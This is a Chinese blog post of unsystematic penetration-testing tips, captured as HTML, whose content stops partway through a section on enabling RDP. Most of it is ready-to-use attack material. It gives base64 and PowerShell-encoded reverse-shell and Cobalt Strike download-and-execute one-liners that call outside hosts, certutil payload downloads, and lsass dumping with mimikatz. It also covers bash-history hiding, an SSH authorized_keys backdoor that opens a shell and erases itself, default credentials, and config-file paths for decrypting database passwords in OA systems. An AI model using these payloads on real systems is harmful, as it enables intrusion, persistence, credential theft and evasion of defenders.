

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fa.png">
  <link rel="icon" href="/img/fa.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="k3rwin">
  <meta name="keywords" content="">
  
    <meta name="description" content="不成体系的渗透测试tips关于RCE调用java.lang.Runtime.exec()的姿势 当命令中包含重定向 ‘ &lt; ‘ ‘ &gt; ‘ 和管道符’ | ‘ 时，执行命令会失效，因为重定向和管道字符的使用方式在启动过程的上下文中没有意义。   借助 Base64 编码转换，通过调用 Bash 或 PowerShell 来制作管道并重新定向，还可以确保参数内没有空格。 123&#x2F;&#x2F;jav">
<meta property="og:type" content="article">
<meta property="og:title" content="tips">
<meta property="og:url" content="https://k3rwin.github.io/2024/04/07/tips/index.html">
<meta property="og:site_name" content="K3rwin&#39;s Blog">
<meta property="og:description" content="不成体系的渗透测试tips关于RCE调用java.lang.Runtime.exec()的姿势 当命令中包含重定向 ‘ &lt; ‘ ‘ &gt; ‘ 和管道符’ | ‘ 时，执行命令会失效，因为重定向和管道字符的使用方式在启动过程的上下文中没有意义。   借助 Base64 编码转换，通过调用 Bash 或 PowerShell 来制作管道并重新定向，还可以确保参数内没有空格。 123&#x2F;&#x2F;jav">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://k3rwin.github.io/tips.assets/image-20240329102738409.png">
<meta property="article:published_time" content="2024-04-07T08:41:53.000Z">
<meta property="article:modified_time" content="2024-04-07T08:42:35.619Z">
<meta property="article:author" content="k3rwin">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://k3rwin.github.io/tips.assets/image-20240329102738409.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>tips - K3rwin&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"k3rwin.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":21395677,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    <!-- 51.la Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript('//js.users.51.la/21395677.js');
      }
    </script>
  

  

  



  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>K3rwin&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202207301915872.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="tips"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        k3rwin
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-04-07 16:41" pubdate>
          2024年4月7日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          10k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          85 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">tips</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="不成体系的渗透测试tips"><a href="#不成体系的渗透测试tips" class="headerlink" title="不成体系的渗透测试tips"></a>不成体系的渗透测试tips</h1><h2 id="关于RCE"><a href="#关于RCE" class="headerlink" title="关于RCE"></a>关于RCE</h2><h3 id="调用java-lang-Runtime-exec-的姿势"><a href="#调用java-lang-Runtime-exec-的姿势" class="headerlink" title="调用java.lang.Runtime.exec()的姿势"></a>调用java.lang.Runtime.exec()的姿势</h3><blockquote>
<p>当命令中包含重定向 ‘ &lt; ‘ ‘ &gt; ‘ 和管道符’ | ‘ 时，执行命令会失效，因为重定向和管道字符的使用方式在启动过程的上下文中没有意义。</p>
</blockquote>
<ol>
<li><p>借助 <a target="_blank" rel="noopener" href="https://www.lintstar.top/shell-java/">Base64 编码转换</a>，通过调用 Bash 或 PowerShell 来制作管道并重新定向，还可以确保参数内没有空格。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java.lang.Runtime.exec(&quot;echo 123&gt;123.txt&quot;)  		//不可行</span><br>java.lang.Runtime.exec(<span class="hljs-string">&quot;bash -c &#123;echo,ZWNobyAxMjM+MTIzLnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)<br>java.lang.Runtime.exec(<span class="hljs-string">&quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ZQBjAGgAbwAgADEAMgAzAD4AMQAyADMALgB0AHgAdAA=&quot;</span>)<br></code></pre></td></tr></table></figure>
</li>
<li><p>使用exec(String [] cmdArray) 或者exec(String []cmdarray,String []envp,File dir)来执</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java.lang.Runtime.exec(&quot;echo 123&gt;123.txt&quot;)  		//不可行</span><br>java.lang.Runtime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo 123&gt;123.txt&quot;</span>&#125;)	<span class="hljs-comment">//linux</span><br>java.lang.Runtime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,<span class="hljs-string">&quot;echo 123&gt;123.txt&quot;</span>&#125;)		<span class="hljs-comment">//Windows</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.lintstar.top/shell-java/">在线Shell 编码 (Java)</a></p>
<h2 id="关于反弹shell-x2F-上线cs"><a href="#关于反弹shell-x2F-上线cs" class="headerlink" title="关于反弹shell&#x2F;上线cs"></a>关于反弹shell&#x2F;上线cs</h2><ul>
<li><p>bash反弹(容错率高)</p>
<ul>
<li>base64版：<code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></li>
</ul>
</li>
<li><p>powershell上线cs</p>
<ul>
<li><p>powershell自带base64版(与常规base64编码不同)：<code>powershell.exe -eNco cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgACAALQBjACAAKABJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEALgAxADEANwAuADEANQA1AC4AMgAxADcAOgA4ADAALwAyADEAOQAxADgAJwApACkAKQA=</code></p>
</li>
<li><p>powershell编码脚本base64.ps1</p>
<ul>
<li><p>脚本使用方法：<code>.\base64.ps1 http://1.117.155.217:80/21918</code>,参数为远程cs上线脚本地址</p>
</li>
<li><p>脚本代码如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>]<br><span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;powershell.exe -nop -w hidden -c (IEX ((new-object net.webclient).downloadstring(&#x27;<span class="hljs-variable">$ip</span>&#x27;)))&quot;</span><br><span class="hljs-variable">$bytes</span> = [<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$command</span>)<br><span class="hljs-variable">$encodedCommand</span> = [<span class="hljs-type">Convert</span>]::ToBase64String(<span class="hljs-variable">$bytes</span>)<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;powershell.exe -eNco &quot;</span>+<span class="hljs-variable">$encodedCommand</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$payload</span><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="关于内网渗透的certutil程序"><a href="#关于内网渗透的certutil程序" class="headerlink" title="关于内网渗透的certutil程序"></a>关于内网渗透的certutil程序</h2><ol>
<li><p>通常用法-远程下载</p>
<p><code>certutil -urlcache -split -f http://vps/shell.exe s.exe </code></p>
</li>
</ol>
<blockquote>
<p>windows自带exe</p>
<p>-f                – 强制覆盖</p>
<p>-split            – 分离嵌入的 ASN.1 元素，并保存到文件</p>
<p>-URLCache         – 显示或删除 URL 缓存项目</p>
</blockquote>
<ol start="2">
<li>base64编码</li>
</ol>
<ul>
<li><p>先本地转换成base64编码文件</p>
<p><code>certutil -encode cs.exe cs.txt</code></p>
<ul>
<li><p>文件太大可考虑分块传输</p>
<p>将文件拆分为 cs1.txt&#x2F;cs2.txt&#x2F;cs3.txt…  可以使用crty+g定位文本位置</p>
</li>
</ul>
</li>
<li><p>目标机远程下载经过base64编码文件</p>
<p><code>certutil -urlcache -split -f http://192.168.0.100/cs.txt</code></p>
<ul>
<li><p>分块传输完成后再整合解码</p>
<p><code>copy cs*.txt cs.txt</code></p>
</li>
</ul>
</li>
<li><p>目标机解码并执行exe</p>
</li>
</ul>
<p>​	<code>certutil -decode cs.txt cs.exe</code></p>
<h2 id="关于win密码获取（bypass）"><a href="#关于win密码获取（bypass）" class="headerlink" title="关于win密码获取（bypass）"></a>关于win密码获取（bypass）</h2><blockquote>
<p>Procdump是微软自家的外部工具，其主要目的是监视应用程序中的CPU尖峰并在尖峰期间生成崩溃转储。</p>
</blockquote>
<ol>
<li>使用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>工具转储lsass进程</li>
</ol>
<p>​	<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
<ol start="2">
<li>mimikatz查看密码</li>
</ol>
<p>​	<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
<h2 id="关于隐藏bash历史命令"><a href="#关于隐藏bash历史命令" class="headerlink" title="关于隐藏bash历史命令"></a>关于隐藏bash历史命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">空格隐藏,命令行前输入空格,需要环境变量 HISTCONTROL 设置为 “ignorespace”</span><br>export HISTCONTROL=ignorespace<br><span class="hljs-meta prompt_">#</span><span class="language-bash">只针对当前shell关闭历史记录，因为用了空格所以不会记录当前命令</span><br>[space]set +o history<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除空格隐藏命令记录</span><br>history -d [export HISTCONTROL=ignorespace 该条命令的行数]<br></code></pre></td></tr></table></figure>

<h2 id="关于SQL注入"><a href="#关于SQL注入" class="headerlink" title="关于SQL注入"></a>关于SQL注入</h2><ol>
<li><p>MSSQL注入</p>
<blockquote>
<p>用于快速查询用户表（某次打点获取sql注入但是表太多了，sqlmap跑太慢了）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">/*得到 dbname数据库中所有包含user字段的表名和表id*/<br>select name,id from dbname.sysobjects where name like &#x27;%user%&#x27;  <br>/*得到 dbname数据库某个user表中所有列字段*/<br>select name,id from dbname.syscolumns where id = xxx <br>/*得到 具体数据*/<br>select username,password from dbname..sysuser <br><br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="正则排除字符串"><a href="#正则排除字符串" class="headerlink" title="正则排除字符串"></a>正则排除字符串</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">正则排除字符串：^(?!.<span class="hljs-strong">*vue).*</span>$<br></code></pre></td></tr></table></figure>

<h2 id="关于linux后门"><a href="#关于linux后门" class="headerlink" title="关于linux后门"></a>关于linux后门</h2><ol>
<li><code>authorized_keys</code> command参数后门,第一次登录执行命令后进行复原（不然无法进行ssh私钥登录）</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command=&quot;bash -i &gt;&amp; /dev/tcp/k3rwin.top/40192 0&gt;&amp;1;sed &#x27;s#.*ssh-rsa*#ssh-rsa#g&#x27; /root/.ssh/authorized_keys&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDgqbBANlcOkviE3lkybDU+jK69GgdiUUYmsiJqmVndbnxmtrmw3zUYzDPliIjAHrAz/NECyyGUL/3A5E6Gmzp5nftXS0TgS1BYxyCx2xD7rYpwyGlgrj6as+mnalAIWL2/Ece8+IMdJpDuqnuip6rgjXaI+MYSr7VlwO44FKMLadgE5Os3bLPZj3WP6+F5dV056Vyzwekb3KrChQ5FAsC4JYJ1e4nP3NFZaBB/GZsKseKYZAIIMwMtJzRsdNZo+FbZRUH4eFIZqYDyo/0Ms76BRQAXiQE2+IKJcuhK5pyXNdK/FlBA7OtkEYZiuEc5Gq8key7qquLvFk/X8TNWERd4wSY+ec4VatMUYWyI3bq4V/g05rxf8P7iZ6NXYX9GelgO5+JroxNu+wil1s4p2lmLHCncG/FnJvwzw5qNiLiXyXfIK91j+D03aN9M1Y/UuQikf6p3OQ54gW5Oxnkfqc9oLgW0FMsUohQMtwfwJiJ9eUupcme4adTlQMWCq1Lhgc= k3rwin@MacBook-Pro.local<br></code></pre></td></tr></table></figure>

<h2 id="各类中间件webshell目录"><a href="#各类中间件webshell目录" class="headerlink" title="各类中间件webshell目录"></a>各类中间件webshell目录</h2><h3 id="1-weblogic"><a href="#1-weblogic" class="headerlink" title="1.weblogic"></a>1.weblogic</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">console后台 <span class="hljs-regexp">/u01/</span>oracle<span class="hljs-regexp">/wlserver/</span>server<span class="hljs-regexp">/lib/</span>consoleapp<span class="hljs-regexp">/webapp/im</span>ages/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">8.146</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/console/im</span>ages/xx.jsp<br></code></pre></td></tr></table></figure>

<h2 id="ruoyi系统漏洞挖掘思路"><a href="#ruoyi系统漏洞挖掘思路" class="headerlink" title="ruoyi系统漏洞挖掘思路"></a>ruoyi系统漏洞挖掘思路</h2><h3 id="1-系统弱口令"><a href="#1-系统弱口令" class="headerlink" title="1.系统弱口令"></a>1.系统弱口令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin/admin123<br>ry/admin123<br></code></pre></td></tr></table></figure>

<h3 id="2-Druid-未授权-or-弱口令"><a href="#2-Druid-未授权-or-弱口令" class="headerlink" title="2.Druid 未授权 or 弱口令"></a>2.Druid 未授权 or 弱口令</h3><p>自定义接口地址可以通过js查看（findsomething）</p>
<p><img src="/tips.assets/image-20240329102738409.png" srcset="/img/loading.gif" lazyload alt="image-20240329102738409"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/prod-api/</span>druid/login.html<br><span class="hljs-regexp">/prod-api/</span>druid/index.html<br><span class="hljs-regexp">/dev-api/</span>druid/login.html<br><span class="hljs-regexp">/dev-api/</span>druid/index.html<br><span class="hljs-regexp">/api/</span>druid/login.html<br><span class="hljs-regexp">/api/</span>druid/index.html<br><span class="hljs-regexp">/admin/</span>druid/login.html<br><span class="hljs-regexp">/admin/</span>druid/index.html<br><span class="hljs-regexp">/admin-api/</span>druid/login.html<br><span class="hljs-regexp">/admin-api/</span>druid/index.html<br></code></pre></td></tr></table></figure>

<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">ruoyi/<span class="hljs-number">123456</span> <br><span class="hljs-literal">admin</span>/<span class="hljs-number">123456</span><br><span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span><br></code></pre></td></tr></table></figure>

<p>进一步利用可结合Seeion和URI模块</p>
<h3 id="3-swagger未授权访问漏洞"><a href="#3-swagger未授权访问漏洞" class="headerlink" title="3.swagger未授权访问漏洞"></a>3.swagger未授权访问漏洞</h3><p>接口地址后拼接路径</p>
<p>经典路径：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/prod-api/</span>swagger-ui/index.html<br><span class="hljs-regexp">/prod-api/</span>v2/api-docs<br><span class="hljs-regexp">/prod-api/</span>v3/api-docs<br></code></pre></td></tr></table></figure>



<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="一-数据库配置文件查找"><a href="#一-数据库配置文件查找" class="headerlink" title="一.数据库配置文件查找"></a>一.数据库配置文件查找</h2><h3 id="1-致远OA"><a href="#1-致远OA" class="headerlink" title="1.致远OA"></a>1.致远OA</h3><p>密码需要配合解密工具</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">路径:Seeyon/A8/base/conf/datasourceCtp.properties<br><br><br>❯ java -jar PassDecode.jar seeyon /xx/sxxxTJCTcg==<br>xx3456<br><br><br><br><br>人员档案表：org_member<br><br>人员档案密码表：org_principal 用户名字段:LOGIN_NAME 密码字段:CREDENTIAL_VALUE<br><br><br>sha解密:<br>❯ java -jar seeyonDecrypt.jar<br>请输入用户名字典绝对路径(格式：user$密文)：/Users/k3rwin/Desktop/1.txt<br>请输入密码字典绝对路径：/Users/k3rwin/Documents/tools/0password/pass200_2021.txt<br><br><br></code></pre></td></tr></table></figure>



<h3 id="2-泛微OA"><a href="#2-泛微OA" class="headerlink" title="2.泛微OA"></a>2.泛微OA</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">路径:WEAVER\ecology\WEB-INF\prop\weaver.properties<br><br>  库/表：ECOLOGY/HrmResource  HrmResourceManager<br></code></pre></td></tr></table></figure>

<h3 id="3-泛微云桥e-Bridge"><a href="#3-泛微云桥e-Bridge" class="headerlink" title="3.泛微云桥e-Bridge"></a>3.泛微云桥e-Bridge</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">配置文件路径：tomcat\webapps\ROOT\WEB-INF\classes\init.properties<br>库/表：ewechat/wx_base_user<br></code></pre></td></tr></table></figure>

<h3 id="4-蓝凌OA"><a href="#4-蓝凌OA" class="headerlink" title="4.蓝凌OA"></a>4.蓝凌OA</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">配置文件路径<span class="hljs-symbol">:/WEB-INF/KmssConfig/admin</span>.properties<br>默认<span class="hljs-title class_">DES</span>加密，秘钥  kmssAdminKey <span class="hljs-title class_">ECB</span> <span class="hljs-title class_">Zero</span><br>数据库用户表：ekp.sys_org_person<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://the-x.cn/cryptography/Des.aspx">des解密地址</a></p>
<h3 id="5-万户OA"><a href="#5-万户OA" class="headerlink" title="5. 万户OA"></a>5. 万户OA</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">数据库配置文件:<span class="hljs-regexp">/deploy/</span>defaultroot.war<span class="hljs-regexp">/WEB-INF/</span>config/whconfig.xml <br></code></pre></td></tr></table></figure>

<h3 id="6-通达OA"><a href="#6-通达OA" class="headerlink" title="6.通达OA"></a>6.通达OA</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">数据库配置文件<span class="hljs-symbol">:/webroot/inc/oa_config</span>.php;<span class="hljs-regexp">/MYOA/mysql</span>5/my.ini <br></code></pre></td></tr></table></figure>



<h3 id="7-HIKVISON配置"><a href="#7-HIKVISON配置" class="headerlink" title="7.HIKVISON配置"></a>7.HIKVISON配置</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd">配置文件:<br>tomcat/apache-tomcat/webapps/center/WEB-INF/classes/conf/config.properties<br><br>运行管理中心数据库配置文件路径：/opt/hikvision/web/opsMgrCenter/conf/config.properties<br><br>java -jar Hikvision.jar EQAQAFZ3Y6HjwZxJLI4q2yt8901gBREknRtK8is0z4RPTHmzwODVhGSolQWTA8fLwnt0aQ==<br>=======================基 本 信 息=======================<br>海康威视综合安防平台: 数据库解密/用户名密码替换<br>下载地址: https://github.com/wafinfo/Hikvision<br>只适合Windows平台使用，暂不支持linux+MacOs<br>=======================使 用 文 档=======================<br><br>lPT2x2Bg<br><br>irds_irdsdb.tb_user表，替换密码和salt值，明文密码为hik12345+<br>user_pwd：<span class="hljs-number">57</span>b303e3875c0e6834e388912a36215e044872f45b0d5bc01ef9eb47267a8292<br>Salt：<span class="hljs-number">8</span>e8c4210822e51efc34904279f8d716ce9a6c3f76f76d58690898eb08533ea76<br></code></pre></td></tr></table></figure>

<h3 id="8-用友NC"><a href="#8-用友NC" class="headerlink" title="8.用友NC"></a>8.用友NC</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">主要的数据表<br>gl<span class="hljs-emphasis">_czy 用户库</span><br><span class="hljs-emphasis">gl_knxx 科目信息</span><br><span class="hljs-emphasis">gl_pznr 凭证内容</span><br><span class="hljs-emphasis">gl_pzml 凭证目录</span><br><span class="hljs-emphasis">gl_</span>yeb 余额表<br></code></pre></td></tr></table></figure>



<h2 id="二-RDP相关"><a href="#二-RDP相关" class="headerlink" title="二.RDP相关"></a>二.RDP相关</h2><ol>
<li><p>rdp 端口查看</p>
<ul>
<li><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></li>
</ul>
</li>
<li><p>开启rdp(老版本和新版windows版本不一样)</p>
<ul>
<li><p>windows server 2003</p>
